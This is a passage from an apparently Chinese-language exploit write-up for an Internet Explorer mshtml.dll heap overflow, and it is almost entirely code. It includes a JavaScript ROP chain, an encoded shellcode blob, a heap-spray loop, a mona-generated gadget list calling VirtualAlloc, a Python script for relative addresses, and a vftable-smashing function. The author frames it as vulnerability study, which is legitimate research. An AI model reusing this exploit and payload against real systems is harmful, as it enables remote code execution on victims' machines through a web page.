class="python keyword">/</code><code class="python keyword">/</code> <code class="python value">0x00000040</code><code class="python keyword">-</code><code class="python plain">&gt; ecx</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x001d263d</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">pop edi; retn</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x000032ac</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">retn</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x00352c9f</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">pop eax; retn</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x90909090</code><code class="python plain">,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">nop</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mshtmlbase </code><code class="python keyword">+</code> <code class="python plain">Number(</code><code class="python value">0x0052e805</code><code class="python plain">),&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">pushad; retn</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x90909090</code><code class="python plain">,</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x90909090</code><code class="python plain">,</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x90909090</code><code class="python plain">,</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x90909090</code><code class="python plain">,</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x90909090</code><code class="python plain">,</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">];</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python plain">arr;</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">}</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">function d2u(dword)</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">{</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var uni </code><code class="python keyword">=</code> <code class="python plain">String.fromCharCode(dword &amp; </code><code class="python value">0xFFFF</code><code class="python plain">);</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">uni </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">String.fromCharCode(dword&gt;&gt;</code><code class="python value">16</code><code class="python plain">);</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python plain">uni;</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">}</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">function tab2uni(heapobj, tab)</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">{</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var uni </code><code class="python keyword">=</code> <code class="python plain">""</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code><code class="python plain">(var i</code><code class="python keyword">=</code><code class="python value">0</code><code class="python plain">;i&lt;tab.length;i</code><code class="python keyword">+</code><code class="python keyword">+</code><code class="python plain">){</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">uni </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">heapobj.d2u(tab[i]);</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">}</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python plain">uni;</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">}</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">heapobj.tab2uni </code><code class="python keyword">=</code> <code class="python plain">tab2uni;</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">heapobj.d2u </code><code class="python keyword">=</code> <code class="python plain">d2u;</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">heapobj.rop_chain </code><code class="python keyword">=</code> <code class="python plain">rop_chain;</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var code </code><code class="python keyword">=</code> <code class="python plain">unescape(</code><code class="python string">"%u40b0%u414b%u1d24%ub4a8%u7799%ube37%ua947%ud41a%u353f%ueb30%ud133%u2ae1%u31e0%ue2d3%u1514%ufd13%u3497%u7a7b%ufc39%u92ba%u9390%u0a4e%ubbf5%u8db2%ue385%uf823%ud53a%u0448%u750d%ud632%u707c%u4642%u7e78%ub12c%u2f98%u1c3c%u727e%u3b7b%u4fe0%ue38c%u4f76%u81b0%u2de2%u35ba%u86bb%u67f8%u8d0c%u9190%u7574%u7f71%u7d3c%u9f15%ub347%ud50b%u784e%u4970%u1b37%uc1ff%uc6fe%uc0c7%ub6d4%u9246%ub4b1%uf588%ua91d%u7c4b%u2548%u7a99%u9b3d%u01b7%u34eb%u1cb5%u38a8%ub8fc%ud609%ube4a%u9714%ue121%ub904%u42b2%u7796%u6924%u80f9%u0dfd%u412c%u2f05%u273f%ubf40%u9893%u7343%u6679%u77a8%ub63f%u7472%u707b%u843d%uebd2%uf630%ubfd5%u71b2%u757a%u1848%u0cf5%u96b7%uf889%u764a%u9b2d%u92b0%u66be%u7d97%ub425%u9114%u4904%uba34%u421c%ue308%uf902%u4140%u4773%u0d27%u93b5%u2299%u1dd4%u7c4f%u2867%u98fc%u2c24%ue212%ufd03%u78a9%u3505%u8390%u2fe0%u4337%u154b%u468d%u79b9%u297f%ubbd6%u197e%u4ee1%u9fb8%ub1b3%u4a3c%u7a7d%u7679%u4670%u2091%u74e1%ub043%u4e71%ub590%u75b7%u983c%u4bb3%ud687%uf86b%u9b40%u117f%ud1f7%u7bf9%u152f%u3427%u1d92%u3d97%u2d49%u720d%u014f%u7ce0%u3105%u10eb%u35f5%ub4b6%u1c2c%u93b2%u4704%ud52b%ubbb1%ue389%u4137%u7e78%u733f%u7742%u2925%ufcd0%u6624%u8dba%u67b9%u1a96%ua8fd%ua9be%ud40b%u4899%u9f14%u87bf%ue2f7%ub80c%u903d%u14b0%u25bb%u7d96%u1a7f%u79f5%uf809%u347c%u7b91%u4e47%ueb81%ue122%ud41b%u7074%ub21d%u2d72%u928d%ub3b1%ua905%u71b4%u4b0c%u9343%u0d76%u989f%u84b5%ub7d5%u4666%ube40%ub8bf%u201c%u48e2%u4a73%u6b2c%u2afc%u04e0%u4941%u3777%u10ba%u7ed6%u332f%ub9fd%u7a9b%u7875%u2415%u1299%uf9d2%u3f97%ub63c%u3567%u27a8%ue386%u7742%u4f73%ue380%ua93c%u757c%uf62b%ud0c0%u27e0%u214b%ue1d3%ub93f%u157d%u8c14%ue2c1%u9904%u7498%u7071%u6637%ueb28%u4e1c%u7fb6%u357b%u3297%u25d4%uf569%u9105%u4047%u0224%u78d6%u7941%uba3d%u49b1%u7276%u1d2f%u85bf%u67fc%u7e92%u4a2c%u7ab4%u1348%u93d5%u8d9b%u03bb%u74fd%u0879%u43e1%ue083%u1873%u46e3%u2372%ub2f8%u88b0%ub8f9%u969f%u75b5%u770c%u7b42%ub72d%u7aa8%ue219%ueb38%ub334%u90be%u4f7e%u0d7f%ub3b6%u3076%ubff5%u479f%u7167%ud40a%u3b7c%u66fc%u41b7%u9615%u3dfd%u3505%ub825%u1c7d%ub54a%u3940%u37d6%u3f92%u971d%u1478%u8d49%ua8b2%u3493%u2c3c%u902f%ud54f%u04a9%u1198%u91f8%ub99b%u9943%ubbb1%u0d70%u4824%u4b0c%ube4e%ub02d%uf93a%u27ba%ub446%udb42%ud9d1%u2474%u5af4%uc929%u49b1%u8cbe%uc04a%u31a0%u1972%uc283%u0304%u1572%ubf6e%u483c%u40e7%u89bd%uc997%ub858%uae85%ue929%ua419%u027c%ue8d2%u9194%u2496%u129a%u131c%ua395%u9b91%u6779%u67b0%ub480%u5912%uc94b%u9e53%u22b6%u7701%u91bc%ufcb5%u2980%ud2b4%u128e%u57ce%ue650%u5964%u5781%u11f3%ud339%u825b%u3038%ufeb8%u3d73%u740a%u9782%u7543%ud7b4%u480f%uda78%u8c4e%u05bf%ue625%ub8c3%u3d3d%u66b9%ua0c8%uec19%u016a%u219b%uc2ec%u8e97%u8c7b%u11bb%ua6a8%u9ac0%u694f%ud841%uad6b%uba09%uf412%u6df7%ue62b%ud150%u6c89%u0672%u2eab%ueb1b%ud081%u63db%ua392%u2ce9%u2c08%ua442%uab96%u9fa5%u236e%u2058%u6d8e%u749f%u05de%uf536%ud5b5%u20b7%u8619%u9b17%u76d9%u4bd8%u9cb1%ub4d7%u9ea1%udd3d%u644b%u22d6%u6723%ucb43%u6831%u579a%u8ebc%u77f6%u19e8%ue16f%ud2b1%uee0e%u9f6c%u6411%u5f82%u8ddf%u73ef%u7d88%u2eba%u811f%u4411%u17a0%ucf9d%u8ff7%u369f%u103f%u1d60%u994b%udef4%ue624%udf18%ub0b4%udf72%u64dc%u8c26%u6af9%ua0f3%uff51%u90fb%ua806%u1e93%u9e70%ue03c%u1e57%u3701%ua49e%u3d73%u64f2"</code><code class="python plain">);</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var rop_chain </code><code class="python keyword">=</code> <code class="python plain">heapobj.tab2uni(heapobj, heapobj.rop_chain(mshtmlbase)) ;</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var shellcode </code><code class="python keyword">=</code> <code class="python plain">rop_chain </code><code class="python keyword">+</code> <code class="python plain">code</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python plain">(shellcode.length &lt; </code><code class="python value">100000</code><code class="python plain">) shellcode </code><code class="python keyword">=</code> <code class="python plain">shellcode </code><code class="python keyword">+</code> <code class="python plain">shellcode;</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var onemeg </code><code class="python keyword">=</code> <code class="python plain">shellcode.substr(</code><code class="python value">0</code><code class="python plain">, </code><code class="python value">64</code><code class="python keyword">*</code><code class="python value">1024</code><code class="python keyword">/</code><code class="python value">2</code><code class="python plain">);</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">(i</code><code class="python keyword">=</code><code class="python value">0</code><code class="python plain">; i&lt;</code><code class="python value">14</code><code class="python plain">; i</code><code class="python keyword">+</code><code class="python keyword">+</code><code class="python plain">) </code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">{</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">onemeg </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">shellcode.substr(</code><code class="python value">0</code><code class="python plain">, </code><code class="python value">64</code><code class="python keyword">*</code><code class="python value">1024</code><code class="python keyword">/</code><code class="python value">2</code><code class="python plain">);</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">}</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">onemeg </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">shellcode.substr(</code><code class="python value">0</code><code class="python plain">, (</code><code class="python value">64</code><code class="python keyword">*</code><code class="python value">1024</code><code class="python keyword">/</code><code class="python value">2</code><code class="python plain">)</code><code class="python keyword">-</code><code class="python plain">(</code><code class="python value">38</code><code class="python keyword">/</code><code class="python value">2</code><code class="python plain">));</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var spray </code><code class="python keyword">=</code> <code class="python plain">new Array();</code>&nbsp;<code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">(i</code><code class="python keyword">=</code><code class="python value">0</code><code class="python plain">; i&lt;</code><code class="python value">400</code><code class="python plain">; i</code><code class="python keyword">+</code><code class="python keyword">+</code><code class="python plain">) </code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">{</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">spray[i] </code><code class="python keyword">=</code> <code class="python plain">onemeg.substr(</code><code class="python value">0</code><code class="python plain">, onemeg.length);</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">}</code><code class="python plain">}</code></td></tr></tbody></table>

其ROP链于笔者环境中并不适用，可用`mona.py`重新生成。转换为相对地址可使用如下脚本：

<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter">1234567891011121314151617181920212223242526272829</td><td class="code"><code class="python keyword">import</code> <code class="python plain">argparse</code>&nbsp;<code class="python keyword">def</code> <code class="python plain">GenRelAddr(Src,Des,ModuleBaseAddr):</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">SrcFile</code><code class="python keyword">=</code><code class="python functions">open</code><code class="python plain">(Src,</code><code class="python string">"r"</code><code class="python plain">)&nbsp;&nbsp; </code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">DestFile</code><code class="python keyword">=</code><code class="python functions">open</code><code class="python plain">(Des,</code><code class="python string">"w"</code><code class="python plain">)</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">DestFile.write(</code><code class="python string">"Relative Address:\n"</code><code class="python plain">)</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">i </code><code class="python keyword">in</code> <code class="python plain">SrcFile.readlines():</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">i.strip().find(</code><code class="python string">"0x"</code><code class="python plain">)</code><code class="python keyword">=</code><code class="python keyword">=</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">:</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">pass</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">num_hex</code><code class="python keyword">=</code><code class="python functions">int</code><code class="python plain">(i[i.find(</code><code class="python string">"0x"</code><code class="python plain">):i.find(</code><code class="python string">"0x"</code><code class="python plain">)</code><code class="python keyword">+</code><code class="python value">10</code><code class="python plain">],</code><code class="python value">16</code><code class="python plain">)</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">rva</code><code class="python keyword">=</code><code class="python plain">num_hex</code><code class="python keyword">-</code><code class="python plain">ModuleBaseAddr</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">rva&gt;</code><code class="python value">0</code> <code class="python keyword">and</code> <code class="python plain">num_hex!</code><code class="python keyword">=</code><code class="python value">2425393296</code><code class="python plain">:&nbsp;&nbsp;&nbsp; </code><code class="python comments">#0x90909090</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">DestFile.write(</code><code class="python string">'&nbsp;&nbsp;&nbsp; '</code><code class="python keyword">+</code><code class="python functions">hex</code><code class="python plain">(rva)</code><code class="python keyword">+</code><code class="python string">'\n'</code><code class="python plain">)</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">DestFile.write(</code><code class="python string">'&nbsp;&nbsp;&nbsp; '</code><code class="python keyword">+</code><code class="python functions">hex</code><code class="python plain">(num_hex)</code><code class="python keyword">+</code><code class="python string">'\n'</code><code class="python plain">)</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">SrcFile.close()</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">DestFile.close()</code>&nbsp;<code class="python keyword">if</code> <code class="python plain">__name__ </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">'__main__'</code><code class="python plain">:</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">parser</code><code class="python keyword">=</code><code class="python plain">argparse.ArgumentParser()</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">parser.add_argument(</code><code class="python string">'-s'</code><code class="python plain">,</code><code class="python functions">help</code><code class="python keyword">=</code><code class="python string">'SrcFile'</code><code class="python plain">)</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">parser.add_argument(</code><code class="python string">'-d'</code><code class="python plain">,</code><code class="python functions">help</code><code class="python keyword">=</code><code class="python string">'DestFile'</code><code class="python plain">)</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">parser.add_argument(</code><code class="python string">'-b'</code><code class="python plain">,</code><code class="python functions">type</code><code class="python keyword">=</code><code class="python functions">int</code><code class="python plain">,</code><code class="python functions">help</code><code class="python keyword">=</code><code class="python string">'ModuleBaseAddr'</code><code class="python plain">)</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">args</code><code class="python keyword">=</code><code class="python plain">parser.parse_args()</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">args.s </code><code class="python keyword">and</code> <code class="python plain">args.d </code><code class="python keyword">and</code> <code class="python plain">args.b:</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">GenRelAddr(args.s,args.d,args.b)</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code><code class="python plain">(</code><code class="python string">"Please enter the correct parameters."</code><code class="python plain">)</code></td></tr></tbody></table>

方法为`-s 1.txt -d 2.txt -b 1666711552`，其中`1.txt`内容如下：

<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter">123456789101112131415161718192021222324252627</td><td class="code"><code class="python plain">rop_gadgets </code><code class="python keyword">=</code> <code class="python plain">[</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#[---INFO:gadgets_to_set_esi:---]</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x6371b8f5</code><code class="python plain">,&nbsp; </code><code class="python comments"># POP ECX # RETN [mshtml.dll] </code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x63581314</code><code class="python plain">,&nbsp; </code><code class="python comments"># ptr to &amp;VirtualAlloc() [IAT mshtml.dll]</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x6392bf47</code><code class="python plain">,&nbsp; </code><code class="python comments"># MOV EAX,DWORD PTR DS:[ECX] # RETN [mshtml.dll] </code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x63aa9a60</code><code class="python plain">,&nbsp; </code><code class="python comments"># XCHG EAX,ESI # RETN [mshtml.dll] </code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#[---INFO:gadgets_to_set_ebp:---]</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x635ac41c</code><code class="python plain">,&nbsp; </code><code class="python comments"># POP EBP # RETN [mshtml.dll] </code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x635ead14</code><code class="python plain">,&nbsp; </code><code class="python comments"># &amp; jmp esp [mshtml.dll]</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#[---INFO:gadgets_to_set_ebx:---]</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x636895b1</code><code class="python plain">,&nbsp; </code><code class="python comments"># POP EBX # RETN [mshtml.dll] </code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x00000001</code><code class="python plain">,&nbsp; </code><code class="python comments"># 0x00000001-&gt; ebx</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#[---INFO:gadgets_to_set_edx:---]</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x637ccce4</code><code class="python plain">,&nbsp; </code><code class="python comments"># POP EDX # RETN [mshtml.dll] </code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x00001000</code><code class="python plain">,&nbsp; </code><code class="python comments"># 0x00001000-&gt; edx</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#[---INFO:gadgets_to_set_ecx:---]</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x6358e41f</code><code class="python plain">,&nbsp; </code><code class="python comments"># POP ECX # RETN [mshtml.dll] </code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x00000040</code><code class="python plain">,&nbsp; </code><code class="python comments"># 0x00000040-&gt; ecx</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#[---INFO:gadgets_to_set_edi:---]</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x6366cccd</code><code class="python plain">,&nbsp; </code><code class="python comments"># POP EDI # RETN [mshtml.dll] </code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x63900c06</code><code class="python plain">,&nbsp; </code><code class="python comments"># RETN (ROP NOP) [mshtml.dll]</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#[---INFO:gadgets_to_set_eax:---]</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x637f3ee3</code><code class="python plain">,&nbsp; </code><code class="python comments"># POP EAX # RETN [mshtml.dll] </code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x90909090</code><code class="python plain">,&nbsp; </code><code class="python comments"># nop</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#[---INFO:pushad:---]</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python value">0x636bfa7c</code><code class="python plain">,&nbsp; </code><code class="python comments"># PUSHAD # RETN [mshtml.dll] </code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">]</code></td></tr></tbody></table>

`1666711552`是笔者环境中`mshtml.dll`基址十进制值。

 

第二次溢出：

<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter">123456</td><td class="code"><code class="python plain">function smash_vtable()</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">{</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var obj_col_0 </code><code class="python keyword">=</code> <code class="python plain">document.getElementById(</code><code class="python string">"132"</code><code class="python plain">);</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">obj_col_0.width </code><code class="python keyword">=</code> <code class="python string">"1178993"</code><code class="python plain">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">smash the vftable </code><code class="python value">0x07070024</code><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">obj_col_0.span </code><code class="python keyword">=</code> <code class="python string">"44"</code><code class="python plain">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">the amount to overwrite</code><code class="python 